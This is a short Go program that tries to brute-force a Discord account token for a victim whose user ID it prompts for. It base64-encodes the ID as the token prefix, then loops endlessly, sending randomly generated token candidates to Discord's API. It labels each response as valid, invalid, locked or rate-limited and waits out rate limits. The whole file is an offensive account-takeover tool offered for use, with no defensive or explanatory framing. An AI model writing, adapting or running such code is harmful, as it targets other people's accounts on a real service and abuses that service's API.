package main

import (
	b64 "encoding/base64"
	"fmt"
	"math/rand"
	"net/http"
	"time"
)

var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")

func randSeq(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func main() {
	fmt.Printf("User Id of victim: ")
	var user_id string
	fmt.Scanln(&user_id)

	part_of_token := b64.StdEncoding.EncodeToString([]byte(user_id))

	for 1 < 2 {
		token := fmt.Sprintf("%s.%s.%s", part_of_token, randSeq(6), randSeq(25))
		req, _ := http.NewRequest("GET", "https://discord.com/api/v9/users/@me/library", nil)
		req.Header.Set("Authorization", token)

		client := &http.Client{}
		resp, _ := client.Do(req)
		resp.Body.Close()

		if resp.StatusCode == 200 {
			fmt.Printf("[VALID] %s\n", token)
		} else if resp.StatusCode == 401 {
			fmt.Printf("[INVALID] %s\n", token)
		} else if resp.StatusCode == 403 {
			fmt.Printf("[LOCKED] %s\n", token)
		} else if resp.StatusCode == 429 {
			fmt.Printf("[RATELIMIT] %s\n", token)
			time.Sleep(120 * time.Second)
		} else {
			fmt.Printf("[UNKNOWN] %s\n", token)
		}
	}

}
